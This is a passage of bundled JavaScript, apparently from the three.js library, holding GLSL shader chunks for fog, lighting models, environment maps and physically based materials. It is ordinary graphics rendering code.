			cameraToVertex = normalize( vec3( - viewMatrix[ 0 ][ 2 ], - viewMatrix[ 1 ][ 2 ], - viewMatrix[ 2 ][ 2 ] ) );
		} else {
			cameraToVertex = normalize( worldPosition.xyz - cameraPosition );
		}
		vec3 worldNormal = transformNormalByInverseViewMatrix( transformedNormal, viewMatrix );
		#ifdef ENVMAP_MODE_REFLECTION
			vReflect = reflect( cameraToVertex, worldNormal );
		#else
			vReflect = refract( cameraToVertex, worldNormal, refractionRatio );
		#endif
	#endif
#endif`,MT=`#ifdef USE_FOG
	vFogDepth = - mvPosition.z;
#endif`,ET=`#ifdef USE_FOG
	varying float vFogDepth;
#endif`,bT=`#ifdef USE_FOG
	#ifdef FOG_EXP2
		float fogFactor = 1.0 - exp( - fogDensity * fogDensity * vFogDepth * vFogDepth );
	#else
		float fogFactor = smoothstep( fogNear, fogFar, vFogDepth );
	#endif
	gl_FragColor.rgb = mix( gl_FragColor.rgb, fogColor, fogFactor );
#endif`,TT=`#ifdef USE_FOG
	uniform vec3 fogColor;
	varying float vFogDepth;
	#ifdef FOG_EXP2
		uniform float fogDensity;
	#else
		uniform float fogNear;
		uniform float fogFar;
	#endif
#endif`,AT=`#ifdef USE_GRADIENTMAP
	uniform sampler2D gradientMap;
#endif
vec3 getGradientIrradiance( vec3 normal, vec3 lightDirection ) {
	float dotNL = dot( normal, lightDirection );
	vec2 coord = vec2( dotNL * 0.5 + 0.5, 0.0 );
	#ifdef USE_GRADIENTMAP
		return vec3( texture2D( gradientMap, coord ).r );
	#else
		vec2 fw = fwidth( coord ) * 0.5;
		return mix( vec3( 0.7 ), vec3( 1.0 ), smoothstep( 0.7 - fw.x, 0.7 + fw.x, coord.x ) );
	#endif
}`,RT=`#ifdef USE_LIGHTMAP
	uniform sampler2D lightMap;
	uniform float lightMapIntensity;
#endif`,CT=`LambertMaterial material;
material.diffuseColor = diffuseColor.rgb;
material.specularStrength = specularStrength;`,wT=`varying vec3 vViewPosition;
struct LambertMaterial {
	vec3 diffuseColor;
	float specularStrength;
};
void RE_Direct_Lambert( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in LambertMaterial material, inout ReflectedLight reflectedLight ) {
	float dotNL = saturate( dot( geometryNormal, directLight.direction ) );
	vec3 irradiance = dotNL * directLight.color;
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
void RE_IndirectDiffuse_Lambert( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in LambertMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
#define RE_Direct				RE_Direct_Lambert
#define RE_IndirectDiffuse		RE_IndirectDiffuse_Lambert`,NT=`uniform bool receiveShadow;
uniform vec3 ambientLightColor;
#if defined( USE_LIGHT_PROBES )
	uniform vec3 lightProbe[ 9 ];
#endif
vec3 shGetIrradianceAt( in vec3 normal, in vec3 shCoefficients[ 9 ] ) {
	float x = normal.x, y = normal.y, z = normal.z;
	vec3 result = shCoefficients[ 0 ] * 0.886227;
	result += shCoefficients[ 1 ] * 2.0 * 0.511664 * y;
	result += shCoefficients[ 2 ] * 2.0 * 0.511664 * z;
	result += shCoefficients[ 3 ] * 2.0 * 0.511664 * x;
	result += shCoefficients[ 4 ] * 2.0 * 0.429043 * x * y;
	result += shCoefficients[ 5 ] * 2.0 * 0.429043 * y * z;
	result += shCoefficients[ 6 ] * ( 0.743125 * z * z - 0.247708 );
	result += shCoefficients[ 7 ] * 2.0 * 0.429043 * x * z;
	result += shCoefficients[ 8 ] * 0.429043 * ( x * x - y * y );
	return result;
}
vec3 getLightProbeIrradiance( const in vec3 lightProbe[ 9 ], const in vec3 normal ) {
	vec3 worldNormal = transformNormalByInverseViewMatrix( normal, viewMatrix );
	vec3 irradiance = shGetIrradianceAt( worldNormal, lightProbe );
	return irradiance;
}
vec3 getAmbientLightIrradiance( const in vec3 ambientLightColor ) {
	vec3 irradiance = ambientLightColor;
	return irradiance;
}
float getDistanceAttenuation( const in float lightDistance, const in float cutoffDistance, const in float decayExponent ) {
	float distanceFalloff = 1.0 / max( pow( lightDistance, decayExponent ), 0.01 );
	if ( cutoffDistance > 0.0 ) {
		distanceFalloff *= pow2( saturate( 1.0 - pow4( lightDistance / cutoffDistance ) ) );
	}
	return distanceFalloff;
}
float getSpotAttenuation( const in float coneCosine, const in float penumbraCosine, const in float angleCosine ) {
	return smoothstep( coneCosine, penumbraCosine, angleCosine );
}
#if NUM_SUN_LIGHTS > 0
	struct SunLight {
		vec3 direction;
		vec3 color;
	};
	uniform SunLight sunLights[ NUM_SUN_LIGHTS ];
	void getSunLightInfo( const in SunLight sunLight, out IncidentLight light ) {
		light.color = sunLight.color;
		light.direction = sunLight.direction;
		light.visible = true;
	}
#endif
#if NUM_DIR_LIGHTS > 0
	struct DirectionalLight {
		vec3 direction;
		vec3 color;
	};
	uniform DirectionalLight directionalLights[ NUM_DIR_LIGHTS ];
	void getDirectionalLightInfo( const in DirectionalLight directionalLight, out IncidentLight light ) {
		light.color = directionalLight.color;
		light.direction = directionalLight.direction;
		light.visible = true;
	}
#endif
#if NUM_POINT_LIGHTS > 0
	struct PointLight {
		vec3 position;
		vec3 color;
		float distance;
		float decay;
	};
	uniform PointLight pointLights[ NUM_POINT_LIGHTS ];
	void getPointLightInfo( const in PointLight pointLight, const in vec3 geometryPosition, out IncidentLight light ) {
		vec3 lVector = pointLight.position - geometryPosition;
		light.direction = normalize( lVector );
		float lightDistance = length( lVector );
		light.color = pointLight.color;
		light.color *= getDistanceAttenuation( lightDistance, pointLight.distance, pointLight.decay );
		light.visible = ( light.color != vec3( 0.0 ) );
	}
#endif
#if NUM_SPOT_LIGHTS > 0
	struct SpotLight {
		vec3 position;
		vec3 direction;
		vec3 color;
		float distance;
		float decay;
		float coneCos;
		float penumbraCos;
	};
	uniform SpotLight spotLights[ NUM_SPOT_LIGHTS ];
	void getSpotLightInfo( const in SpotLight spotLight, const in vec3 geometryPosition, out IncidentLight light ) {
		vec3 lVector = spotLight.position - geometryPosition;
		light.direction = normalize( lVector );
		float angleCos = dot( light.direction, spotLight.direction );
		float spotAttenuation = getSpotAttenuation( spotLight.coneCos, spotLight.penumbraCos, angleCos );
		if ( spotAttenuation > 0.0 ) {
			float lightDistance = length( lVector );
			light.color = spotLight.color * spotAttenuation;
			light.color *= getDistanceAttenuation( lightDistance, spotLight.distance, spotLight.decay );
			light.visible = ( light.color != vec3( 0.0 ) );
		} else {
			light.color = vec3( 0.0 );
			light.visible = false;
		}
	}
#endif
#if NUM_RECT_AREA_LIGHTS > 0
	struct RectAreaLight {
		vec3 color;
		vec3 position;
		vec3 halfWidth;
		vec3 halfHeight;
	};
	uniform sampler2D ltc_1;	uniform sampler2D ltc_2;
	uniform RectAreaLight rectAreaLights[ NUM_RECT_AREA_LIGHTS ];
#endif
#if NUM_HEMI_LIGHTS > 0
	struct HemisphereLight {
		vec3 direction;
		vec3 skyColor;
		vec3 groundColor;
	};
	uniform HemisphereLight hemisphereLights[ NUM_HEMI_LIGHTS ];
	vec3 getHemisphereLightIrradiance( const in HemisphereLight hemiLight, const in vec3 normal ) {
		float dotNL = dot( normal, hemiLight.direction );
		float hemiDiffuseWeight = 0.5 * dotNL + 0.5;
		vec3 irradiance = mix( hemiLight.groundColor, hemiLight.skyColor, hemiDiffuseWeight );
		return irradiance;
	}
#endif
#include <lightprobes_pars_fragment>`,DT=`#ifdef USE_ENVMAP
	vec3 getIBLIrradiance( const in vec3 normal ) {
		#ifdef ENVMAP_TYPE_CUBE_UV
			vec3 worldNormal = transformNormalByInverseViewMatrix( normal, viewMatrix );
			vec4 envMapColor = textureCubeUV( envMap, envMapRotation * worldNormal, 1.0 );
			return PI * envMapColor.rgb * envMapIntensity;
		#else
			return vec3( 0.0 );
		#endif
	}
	vec3 getIBLRadiance( const in vec3 viewDir, const in vec3 normal, const in float roughness ) {
		#ifdef ENVMAP_TYPE_CUBE_UV
			vec3 reflectVec = reflect( - viewDir, normal );
			reflectVec = normalize( mix( reflectVec, normal, pow4( roughness ) ) );
			reflectVec = transformDirectionByInverseViewMatrix( reflectVec, viewMatrix );
			vec4 envMapColor = textureCubeUV( envMap, envMapRotation * reflectVec, roughness );
			return envMapColor.rgb * envMapIntensity;
		#else
			return vec3( 0.0 );
		#endif
	}
	#ifdef USE_RETROREFLECTION
		vec3 getIBLRetroRadiance( const in vec3 viewDir, const in vec3 normal, const in float roughness ) {
			#ifdef ENVMAP_TYPE_CUBE_UV
				vec3 retroVec = normalize( mix( viewDir, normal, pow4( roughness ) ) );
				retroVec = transformDirectionByInverseViewMatrix( retroVec, viewMatrix );
				vec4 envMapColor = textureCubeUV( envMap, envMapRotation * retroVec, roughness );
				return envMapColor.rgb * envMapIntensity;
			#else
				return vec3( 0.0 );
			#endif
		}
	#endif
	#ifdef USE_ANISOTROPY
		vec3 getIBLAnisotropyRadiance( const in vec3 viewDir, const in vec3 normal, const in float roughness, const in vec3 bitangent, const in float anisotropy ) {
			#ifdef ENVMAP_TYPE_CUBE_UV
				vec3 bentNormal = cross( bitangent, viewDir );
				bentNormal = normalize( cross( bentNormal, bitangent ) );
				bentNormal = normalize( mix( bentNormal, normal, pow2( pow2( 1.0 - anisotropy * ( 1.0 - roughness ) ) ) ) );
				return getIBLRadiance( viewDir, bentNormal, roughness );
			#else
				return vec3( 0.0 );
			#endif
		}
		#ifdef USE_RETROREFLECTION
			vec3 getIBLAnisotropyRetroRadiance( const in vec3 viewDir, const in vec3 normal, const in float roughness, const in vec3 bitangent, const in float anisotropy ) {
				#ifdef ENVMAP_TYPE_CUBE_UV
					vec3 bentNormal = cross( bitangent, viewDir );
					bentNormal = normalize( cross( bentNormal, bitangent ) );
					bentNormal = normalize( mix( bentNormal, normal, pow2( pow2( 1.0 - anisotropy * ( 1.0 - roughness ) ) ) ) );
					return getIBLRetroRadiance( viewDir, bentNormal, roughness );
				#else
					return vec3( 0.0 );
				#endif
			}
		#endif
	#endif
#endif`,UT=`ToonMaterial material;
material.diffuseColor = diffuseColor.rgb;`,LT=`varying vec3 vViewPosition;
struct ToonMaterial {
	vec3 diffuseColor;
};
void RE_Direct_Toon( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in ToonMaterial material, inout ReflectedLight reflectedLight ) {
	vec3 irradiance = getGradientIrradiance( geometryNormal, directLight.direction ) * directLight.color;
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
void RE_IndirectDiffuse_Toon( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in ToonMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
#define RE_Direct				RE_Direct_Toon
#define RE_IndirectDiffuse		RE_IndirectDiffuse_Toon`,OT=`BlinnPhongMaterial material;
material.diffuseColor = diffuseColor.rgb;
material.specularColor = specular;
material.specularShininess = shininess;
material.specularStrength = specularStrength;`,PT=`varying vec3 vViewPosition;
struct BlinnPhongMaterial {
	vec3 diffuseColor;
	vec3 specularColor;
	float specularShininess;
	float specularStrength;
};
void RE_Direct_BlinnPhong( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {
	float dotNL = saturate( dot( geometryNormal, directLight.direction ) );
	vec3 irradiance = dotNL * directLight.color;
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
	reflectedLight.directSpecular += irradiance * BRDF_BlinnPhong( directLight.direction, geometryViewDir, geometryNormal, material.specularColor, material.specularShininess ) * material.specularStrength;
}
void RE_IndirectDiffuse_BlinnPhong( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
#define RE_Direct				RE_Direct_BlinnPhong
#define RE_IndirectDiffuse		RE_IndirectDiffuse_BlinnPhong`,IT=`PhysicalMaterial material;
material.diffuseColor = diffuseColor.rgb;
material.diffuseContribution = diffuseColor.rgb * ( 1.0 - metalnessFactor );
material.metalness = metalnessFactor;
vec3 dxy = max( abs( dFdx( nonPerturbedNormal ) ), abs( dFdy( nonPerturbedNormal ) ) );
float geometryRoughness = max( max( dxy.x, dxy.y ), dxy.z );
material.roughness = max( roughnessFactor, 0.0525 );material.roughness += geometryRoughness;
material.roughness = min( material.roughness, 1.0 );
#ifdef IOR
	material.ior = ior;
	#ifdef USE_SPECULAR
		float specularIntensityFactor = specularIntensity;
		vec3 specularColorFactor = specularColor;
		#ifdef USE_SPECULAR_COLORMAP
			specularColorFactor *= texture2D( specularColorMap, vSpecularColorMapUv ).rgb;
		#endif
		#ifdef USE_SPECULAR_INTENSITYMAP
			specularIntensityFactor *= texture2D( specularIntensityMap, vSpecularIntensityMapUv ).a;
		#endif
		material.specularF90 = mix( specularIntensityFactor, 1.0, metalnessFactor );
	#else
		float specularIntensityFactor = 1.0;
		vec3 specularColorFactor = vec3( 1.0 );
		material.specularF90 = 1.0;
	#endif
	material.specularColor = min( pow2( ( material.ior - 1.0 ) / ( material.ior + 1.0 ) ) * specularColorFactor, vec3( 1.0 ) ) * specularIntensityFactor;
	material.specularColorBlended = mix( material.specularColor, diffuseColor.rgb, metalnessFactor );
#else
	material.specularColor = vec3( 0.04 );
	material.specularColorBlended = mix( material.specularColor, diffuseColor.rgb, metalnessFactor );
	material.specularF90 = 1.0;
#endif
#ifdef USE_CLEARCOAT
	material.clearcoat = clearcoat;
	material.clearcoatRoughness = clearcoatRoughness;
	material.clearcoatF0 = vec3( 0.04 );
	material.clearcoatF90 = 1.0;
	#ifdef USE_CLEARCOATMAP
		material.clearcoat *= texture2D( clearcoatMap, vClearcoatMapUv ).x;
	#endif
	#ifdef USE_CLEARCOAT_ROUGHNESSMAP
		material.clearcoatRoughness *= texture2D( clearcoatRoughnessMap, vClearcoatRoughnessMapUv ).y;
	#endif
	material.clearcoat = saturate( material.clearcoat );	material.clearcoatRoughness = max( material.clearcoatRoughness, 0.0525 );
	material.clearcoatRoughness += geometryRoughness;
	material.clearcoatRoughness = min( material.clearcoatRoughness, 1.0 );
#endif
#ifdef USE_DISPERSION
	material.dispersion = dispersion;
#endif
#ifdef USE_RETROREFLECTION
	material.retroreflectivity = retroreflectivity;
#endif
#ifdef USE_IRIDESCENCE
	material.iridescence = iridescence;
	material.iridescenceIOR = iridescenceIOR;
	#ifdef USE_IRIDESCENCEMAP
		material.iridescence *= texture2D( iridescenceMap, vIridescenceMapUv ).r;
	#endif
	#ifdef USE_IRIDESCENCE_THICKNESSMAP
		material.iridescenceThickness = (iridescenceThicknessMaximum - iridescenceThicknessMinimum) * texture2D( iridescenceThicknessMap, vIridescenceThicknessMapUv ).g + iridescenceThicknessMinimum;
	#else
		material.iridescenceThickness = iridescenceThicknessMaximum;
	#endif
#endif
#ifdef USE_SHEEN
	material.sheenColor = sheenColor;
	#ifdef USE_SHEEN_COLORMAP
		material.sheenColor *= texture2D( sheenColorMap, vSheenColorMapUv ).rgb;
	#endif
	material.sheenRoughness = clamp( sheenRoughness, 0.0001, 1.0 );
	#ifdef USE_SHEEN_ROUGHNESSMAP
		material.sheenRoughness *= texture2D( sheenRoughnessMap, vSheenRoughnessMapUv ).a;
	#endif
#endif
#ifdef USE_ANISOTROPY
	#ifdef USE_ANISOTROPYMAP
		mat2 anisotropyMat = mat2( anisotropyVector.x, anisotropyVector.y, - anisotropyVector.y, anisotropyVector.x );
		vec3 anisotropyPolar = texture2D( anisotropyMap, vAnisotropyMapUv ).rgb;
		vec2 anisotropyV = anisotropyMat * normalize( 2.0 * anisotropyPolar.rg - vec2( 1.0 ) ) * anisotropyPolar.b;
	#else
		vec2 anisotropyV = anisotropyVector;
	#endif
	material.anisotropy = length( anisotropyV );
	if( material.anisotropy == 0.0 ) {
		anisotropyV = vec2( 1.0, 0.0 );
	} else {
		anisotropyV /= material.anisotropy;
		material.anisotropy = saturate( material.anisotropy );
	}
	material.alphaT = mix( pow2( material.roughness ), 1.0, pow2( material.anisotropy ) );
	material.anisotropyT = tbn[ 0 ] * anisotropyV.x + tbn[ 1 ] * anisotropyV.y;
	material.anisotropyB = tbn[ 1 ] * anisotropyV.x - tbn[ 0 ] * anisotropyV.y;
#endif`,zT=`uniform sampler2D dfgLUT;
struct PhysicalMaterial {
	vec3 diffuseColor;
	vec3 diffuseContribution;
	vec3 specularColor;
	vec3 specularColorBlended;
	float roughness;
	float metalness;
	float specularF90;
	float dispersion;
	vec2 dfg;
	vec3 multiScatteringCompensation;
	#ifdef USE_RETROREFLECTION
		float retroreflectivity;
	#endif
	#ifdef USE_CLEARCOAT
		float clearcoat;
		float clearcoatRoughness;
		vec3 clearcoatF0;
		float clearcoatF90;
	#endif
	#ifdef USE_IRIDESCENCE
		float iridescence;
		float iridescenceIOR;
		float iridescenceThickness;
		vec3 iridescenceFresnel;
		vec3 iridescenceF0Dielectric;
		vec3 iridescenceF0Metallic;
	#endif
	#ifdef USE_SHEEN
		vec3 sheenColor;
		float sheenRoughness;
	#endif
	#ifdef IOR
		float ior;
	#endif
	#ifdef USE_TRANSMISSION
		float transmission;
		float transmissionAlpha;
		float thickness;
		float attenuationDistance;
		vec3 attenuationColor;
	#endif
	#ifdef USE_ANISOTROPY
		float anisotropy;
		float alphaT;
		vec3 anisotropyT;
		vec3 anisotropyB;
	#endif
};
vec3 clearcoatSpecularDirect = vec3( 0.0 );
vec3 clearcoatSpecularIndirect = vec3( 0.0 );
vec3 sheenSpecularDirect = vec3( 0.0 );
vec3 sheenSpecularIndirect = vec3(0.0 );
vec3 Schlick_to_F0( const in vec3 f, const in float f90, const in float dotVH ) {
    float x = clamp( 1.0 - dotVH, 0.0, 1.0 );
    float x2 = x * x;
    float x5 = clamp( x * x2 * x2, 0.0, 0.9999 );
    return ( f - vec3( f90 ) * x5 ) / ( 1.0 - x5 );
}
float V_GGX_SmithCorrelated( const in float alpha, const in float dotNL, const in float dotNV ) {
	float a2 = pow2( alpha );
	float gv = dotNL * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );
	float gl = dotNV * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );
	return 0.5 / max( gv + gl, EPSILON );
}
float D_GGX( const in float alpha, const in float dotNH ) {
	float a2 = pow2( alpha );
	float denom = pow2( dotNH ) * ( a2 - 1.0 ) + 1.0;
	return RECIPROCAL_PI * a2 / pow2( denom );
}
#ifdef USE_ANISOTROPY
	float V_GGX_SmithCorrelated_Anisotropic( const in float alphaT, const in float alphaB, const in float dotTV, const in float dotBV, const in float dotTL, const in float dotBL, const in float dotNV, const in float dotNL ) {
		float gv = dotNL * length( vec3( alphaT * dotTV, alphaB * dotBV, dotNV ) );
		float gl = dotNV * length( vec3( alphaT * dotTL, alphaB * dotBL, dotNL ) );
		return 0.5 / max( gv + gl, EPSILON );
	}
	float D_GGX_Anisotropic( const in float alphaT, const in float alphaB, const in float dotNH, const in float dotTH, const in float dotBH ) {
		float a2 = alphaT * alphaB;
		highp vec3 v = vec3( alphaB * dotTH, alphaT * dotBH, a2 * dotNH );
		highp float v2 = dot( v, v );
		float w2 = a2 / v2;
		return RECIPROCAL_PI * a2 * pow2 ( w2 );
	}
#endif
#ifdef USE_CLEARCOAT
	vec3 BRDF_GGX_Clearcoat( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in PhysicalMaterial material) {
		vec3 f0 = material.clearcoatF0;
		float f90 = material.clearcoatF90;
		float roughness = material.clearcoatRoughness;
		float alpha = pow2( roughness );
		vec3 halfDir = normalize( lightDir + viewDir );
		float dotNL = saturate( dot( normal, lightDir ) );
		float dotNV = saturate( dot( normal, viewDir ) );
		float dotNH = saturate( dot( normal, halfDir ) );
		float dotVH = saturate( dot( viewDir, halfDir ) );
		vec3 F = F_Schlick( f0, f90, dotVH );
		float V = V_GGX_SmithCorrelated( alpha, dotNL, dotNV );
		float D = D_GGX( alpha, dotNH );
		return F * ( V * D );
	}
#endif
vec3 BRDF_GGX( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in PhysicalMaterial material ) {
	vec3 f0 = material.specularColorBlended;
	float f90 = material.specularF90;
	float roughness = material.roughness;
	float alpha = pow2( roughness );
	vec3 halfDir = normalize( lightDir + viewDir );
	float dotNL = saturate( dot( normal, lightDir ) );
	float dotNV = saturate( dot( normal, viewDir ) );
	float dotNH = saturate( dot( normal, halfDir ) );
	float dotVH = saturate( dot( viewDir, halfDir ) );
	vec3 F = F_Schlick( f0, f90, dotVH );
	#ifdef USE_IRIDESCENCE
		F = mix( F, material.iridescenceFresnel, material.iridescence );
	#endif
	#ifdef USE_ANISOTROPY
		float dotTL = dot( material.anisotropyT, lightDir );
		float dotTV = dot( material.anisotropyT, viewDir );
		float dotTH = dot( material.anisotropyT, halfDir );
		float dotBL = dot( material.anisotropyB, lightDir );
		float dotBV = dot( material.anisotropyB, viewDir );
		float dotBH = dot( material.anisotropyB, halfDir );
		float V = V_GGX_SmithCorrelated_Anisotropic( material.alphaT, alpha, dotTV, dotBV, dotTL, dotBL, dotNV, dotNL );
		float D = D_GGX_Anisotropic( material.alphaT, alpha, dotNH, dotTH, dotBH );
	#else
		float V = V_GGX_SmithCorrelated( alpha, dotNL, dotNV );
		float D = D_GGX( alpha, dotNH );
	#endif
	return F * ( V * D );
}
vec2 LTC_Uv( const in vec3 N, const in vec3 V, const in float roughness ) {
	const float LUT_SIZE = 64.0;
	const float LUT_SCALE = ( LUT_SIZE - 1.0 ) / LUT_SIZE;
	const float LUT_BIAS = 0.5 / LUT_SIZE;
	float dotNV = saturate( dot( N, V ) );
	vec2 uv = vec2( roughness, sqrt( 1.0 - dotNV ) );
	uv = uv * LUT_SCALE + LUT_BIAS;
	return uv;
}
float LTC_ClippedSphereFormFactor( const in vec3 f ) {
	float l = length( f );
	return max( ( l * l + f.z ) / ( l + 1.0 ), 0.0 );
}
vec3 LTC_EdgeVectorFormFactor( const in vec3 v1, const in vec3 v2 ) {
	float x = dot( v1, v2 );
	float y = abs( x );
	float a = 0.8543985 + ( 0.4965155 + 0.0145206 * y ) * y;
	float b = 3.4175940 + ( 4.1616724 + y ) * y;
	float v = a / b;
	float theta_sintheta = ( x > 0.0 ) ? v : 0.5 * inversesqrt( max( 1.0 - x * x, 1e-7 ) ) - v;
	return cross( v1, v2 ) * theta_sintheta;
}
vec3 LTC_Evaluate( const in vec3 N, const in vec3 V, const in vec3 P, const in mat3 mInv, const in vec3 rectCoords[ 4 ] ) {
	vec3 v1 = rectCoords[ 1 ] - rectCoords[ 0 ];
	vec3 v2 = rectCoords[ 3 ] - rectCoords[ 0 ];
	vec3 lightNormal = cross( v1, v2 );
	if( dot( lightNormal, P - rectCoords[ 0 ] ) < 0.0 ) return vec3( 0.0 );
	vec3 T1, T2;
	T1 = normalize( V - N * dot( V, N ) );
	T2 = - cross( N, T1 );
	mat3 mat = mInv * transpose( mat3( T1, T2, N ) );
	vec3 coords[ 4 ];
	coords[ 0 ] = mat * ( rectCoords[ 0 ] - P );
	coords[ 1 ] = mat * ( rectCoords[ 1 ] - P );
	coords[ 2 ] = mat * ( rectCoords[ 2 ] - P );
	coords[ 3 ] = mat * ( rectCoords[ 3 ] - P );
	coords[ 0 ] = normalize( coords[ 0 ] );
	coords[ 1 ] = normalize( coords[ 1 ] );
	coords[ 2 ] = normalize( coords[ 2 ] );
	coords[ 3 ] = normalize( coords[ 3 ] );
	vec3 vectorFormFactor = vec3( 0.0 );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 0 ], coords[ 1 ] );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 1 ], coords[ 2 ] );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 2 ], coords[ 3 ] );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 3 ], coords[ 0 ] );
	float result = LTC_ClippedSphereFormFactor( vectorFormFactor );
	return vec3( result );
}
#if defined( USE_SHEEN )
float D_Charlie( float roughness, float dotNH ) {
	float alpha = pow2( roughness );
	float invAlpha = 1.0 / alpha;
	float cos2h = dotNH * dotNH;
	float sin2h = max( 1.0 - cos2h, 0.0078125 );
	return ( 2.0 + invAlpha ) * pow( sin2h, invAlpha * 0.5 ) / ( 2.0 * PI );
}
float V_Neubelt( float dotNV, float dotNL ) {
	return saturate( 1.0 / ( 4.0 * ( dotNL + dotNV - dotNL * dotNV ) ) );
}
vec3 BRDF_Sheen( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, vec3 sheenColor, const in float sheenRoughness ) {
	vec3 halfDir = normalize( lightDir + viewDir );
	float dotNL = saturate( dot( normal, lightDir ) );
	float dotNV = saturate( dot( normal, viewDir ) );
	float dotNH = saturate( dot( normal, halfDir ) );
	float D = D_Charlie( sheenRoughness, dotNH );
	float V = V_Neubelt( dotNV, dotNL );
	return sheenColor * ( D * V );
}
#endif
float IBLSheenBRDF( const in vec3 normal, const in vec3 viewDir, const in float roughness ) {
	float dotNV = saturate( dot( normal, viewDir ) );
	float r2 = roughness * roughness;
	float rInv = 1.0 / ( roughness + 0.1 );
	float a = -1.9362 + 1.0678 * roughness + 0.4573 * r2 - 0.8469 * rInv;
	float b = -0.6014 + 0.5538 * roughness - 0.4670 * r2 - 0.1255 * rInv;
	float DG = exp( a * dotNV + b );
	return saturate( DG );
}
vec3 EnvironmentBRDF( const in vec3 normal, const in vec3 viewDir, const in vec3 specularColor, const in float specularF90, const in float roughness ) {
	float dotNV = saturate( dot( normal, viewDir ) );
	vec2 fab = texture2D( dfgLUT, vec2( roughness, dotNV ) ).rg;
	return specularColor * fab.x + specularF90 * fab.y;
}
#ifdef USE_IRIDESCENCE
void computeMultiscatteringIridescence( const in vec2 fab, const in vec3 specularColor, const in float specularF90, const in float iridescence, const in vec3 iridescenceF0, inout vec3 singleScatter, inout vec3 multiScatter ) {
#else
void computeMultiscattering( const in vec2 fab, const in vec3 specularColor, const in float specularF90, inout vec3 singleScatter, inout vec3 multiScatter ) {
#endif
	#ifdef USE_IRIDESCENCE
		vec3 Fr = mix( specularColor, iridescenceF0, iridescence );
	#else
		vec3 Fr = specularColor;
	#endif
	vec3 FssEss = Fr * fab.x + specularF90 * fab.y;
	float Ess = fab.x + fab.y;
	float Ems = 1.0 - Ess;
	vec3 Favg = Fr + ( 1.0 - Fr ) * 0.047619;	vec3 Fms = FssEss * Favg / ( 1.0 - Ems * Favg );
	singleScatter += FssEss;
	multiScatter += Fms * Ems;
}
#if NUM_RECT_AREA_LIGHTS > 0
	void RE_Direct_RectArea_Physical( const in RectAreaLight rectAreaLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {
		vec3 normal = geometryNormal;
		vec3 viewDir = geometryViewDir;
		vec3 position = geometryPosition;
		vec3 lightPos = rectAreaLight.position;
		vec3 halfWidth = rectAreaLight.halfWidth;
		vec3 halfHeight = rectAreaLight.halfHeight;
		vec3 lightColor = rectAreaLight.color;
		float roughness = material.roughness;
		vec3 rectCoords[ 4 ];
		rectCoords[ 0 ] = lightPos + halfWidth - halfHeight;		rectCoords[ 1 ] = lightPos - halfWidth - halfHeight;
		rectCoords[ 2 ] = lightPos - halfWidth + halfHeight;
		rectCoords[ 3 ] = lightPos + halfWidth + halfHeight;
		vec2 uv = LTC_Uv( normal, viewDir, roughness );
		vec4 t1 = texture2D( ltc_1, uv );
		vec4 t2 = texture2D( ltc_2, uv );
		mat3 mInv = mat3(
			vec3( t1.x, 0, t1.y ),
			vec3(    0, 1,    0 ),
			vec3( t1.z, 0, t1.w )
		);
		vec3 fresnel = ( material.specularColorBlended * t2.x + ( material.specularF90 - material.specularColorBlended ) * t2.y );
		reflectedLight.directSpecular += lightColor * fresnel * LTC_Evaluate( normal, viewDir, position, mInv, rectCoords );
		reflectedLight.directDiffuse += lightColor * material.diffuseContribution * LTC_Evaluate( normal, viewDir, position, mat3( 1.0 ), rectCoords );
		#ifdef USE_CLEARCOAT
			vec3 Ncc = geometryClearcoatNormal;
			vec2 uvClearcoat = LTC_Uv( Ncc, viewDir, material.clearcoatRoughness );
			vec4 t1Clearcoat = texture2D( ltc_1, uvClearcoat );
			vec4 t2Clearcoat = texture2D( ltc_2, uvClearcoat );
			mat3 mInvClearcoat = mat3(
				vec3( t1Clearcoat.x, 0, t1Clearcoat.y ),
				vec3(             0, 1,             0 ),
				vec3( t1Clearcoat.z, 0, t1Clearcoat.w )
			);
			vec3 fresnelClearcoat = material.clearcoatF0 * t2Clearcoat.x + ( material.clearcoatF90 - material.clearcoatF0 ) * t2Clearcoat.y;
			clearcoatSpecularDirect += lightColor * fresnelClearcoat * LTC_Evaluate( Ncc, viewDir, position, mInvClearcoat, rectCoords );
		#endif
	}
#endif
void RE_Direct_Physical( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {
